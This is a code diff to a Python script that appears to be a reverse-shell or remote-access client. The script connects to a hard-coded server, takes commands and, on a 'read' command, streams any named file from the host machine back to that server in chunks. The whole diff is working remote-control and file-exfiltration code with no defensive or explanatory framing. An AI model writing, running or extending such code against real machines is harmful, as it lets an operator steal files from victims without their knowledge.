@@ -2,6 +2,7 @@ import socket
 import os
 import subprocess
 import sys
+import struct
 
 SERVER_HOST = "10.0.1.24"
 #SERVER_HOST = "127.0.0.1"
@@ -32,11 +33,30 @@ while True:
     elif splitted_command[0].lower() == 'read':
         file_name = splitted_command[1]
         
+        #if os.path.isfile(file_name):
+        #    # Then the file exists, and send file size
+        #    s.send(struct.pack("i", os.path.getsize(file_name)))
+        file_size = os.path.getsize(file_name)
+        s.send(str(file_size).encode())
+
+        print("Sending file...")
+        content = open(file_name, "rb")
+
+        l = content.read(BUFFER_SIZE)
+        while l :
+            s.send(l)
+            l = content.read(BUFFER_SIZE)
+        content.close()
+
+        s.recv(BUFFER_SIZE)
+
+        """
         file_size = os.path.getsize(file_name)
         s.send(str(file_size).encode())
         with open(file_name, "rb") as f:
             data = f.read()
         s.send(data)
+        """
         """
         with open(file_name, "rb") as f:
             while True:
